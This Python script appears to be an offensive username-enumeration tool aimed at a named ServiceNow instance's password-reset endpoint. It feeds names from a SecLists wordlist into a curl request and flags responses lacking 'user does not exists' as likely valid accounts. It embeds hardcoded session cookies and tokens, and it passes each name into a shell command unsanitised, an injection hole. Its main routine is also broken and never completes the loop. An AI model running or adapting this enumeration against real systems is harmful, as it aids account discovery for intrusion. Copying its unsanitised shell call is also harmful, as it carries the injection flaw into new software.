#!/usr/bin/env python3

import subprocess
import asyncio
import aiohttp
from typing import Generator


class Bouncer:

    def curlit(self, name: str) -> tuple:
        '''
        Send HTTPS request with user parameter to test
        '''
        try:
            username = str(name)
            curl = "curl 'https://qlddetuat.service-now.com/xmlhttp.do' -H 'Origin: https://qlddetuat.service-now.com' -H " \
                   "'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.9,nb;q=0.8' -H " \
                   "'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36' -H " \
                   "'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H " \
                   "'Referer: https://qlddetuat.service-now.com/$pwd_reset.do?sysparm_url=ss_default' -H " \
                   "'X-UserToken: de0f68834f565700c2faa90f0310c7661090bf95cc9a43311602bdd6485a3b9f0d56d91c' -H " \
                   "'Cookie: JSESSIONID=A912DDEB2456AAD1EDCBF5CE5CC37B50; glide_user_route=glide.87e117ec8332c1a17959ceb850f4946f; " \
                   "BIGipServerpool_qlddetuat=612401674.34366.0000; __CJ_g_startTime=%221527665521274%22' -H " \
                   "'Connection: keep-alive' --data 'sysparm_processor=PwdAjaxVerifyIdentity&sysparm_scope=global&sysparm_want_session_messages=true&" \
                   "sysparm_name=verifyIdentity&sysparm_process_id=c6b0c20667100200a5a0f3b457415ad5&sysparm_user_id=" + username + "&" \
                   "sysparam_pwd_csrf_token=6gdWuXF%2FnIOL3F2H3A8YMVkNCKg%3D&ni.nolog.x_referer=ignore&x_referer=%24pwd_reset.do%3Fsysparm_url%3Dss_default' --compressed"
            cmd = subprocess.run([curl], shell=True, stdout=subprocess.PIPE)
            out = cmd.stdout
            out = out.decode()
            out = str(out)
            return out, name
        except Exception as e:
            print("Error! in Bouncer.curlit: " + str(e))

    def parse_it(self, name: str, stdout: str):
        '''
        Parse response for user against known value for invalid user.
        '''
        try:
            if not "user does not exists" in stdout:
                print("\nAlert!! \"" + name + "\" may be a valid user!!!!\nAn unexpected response was received from server.\n")
                print("XML response received: " + "\n" + stdout + "\n\n")
            else:
                print("\n\n" + name.rstrip("\n") + " Is not a valid user.\n")
        except Exception as e:
            print("Error! in Bouncer.parse_it: " + str(e))

    def getnames(self, path_to_name_list: str) -> Generator:
        '''
        Read user names from file into generator
        '''
        try:
            with open(path_to_name_list, "r") as file_name:
                names = (n.rstrip("\n") for n in file_name.readlines())
            return names
        except Exception as e:
            print("Error! in Bouncer.getnames: " + str(e))


def main():
    '''
    Execution Flow
    '''
    try:
        your_username_list: str = "/root/SecLists/Usernames/Names/names.txt"

        b = Bouncer()
        names = b.getnames(your_username_list)
        responses, names = (b.curlit(n) for n in names)
        parse = (b.parse_it(n, r) for r in responses for n in names)
        # for n in names:
        #     res = b.curlit(n)
        #     b.parse_it(n, res)

        loop = asyncio.get_event_loop()



        exit(0)
    except Exception as e:
        print("Error! in Bouncer.main: " + str(e))
        exit(1)

if __name__ == '__main__':
    main()

#TODO: check CSRF token expiration and fetch new one
# asyncio aiohttp if no limiting

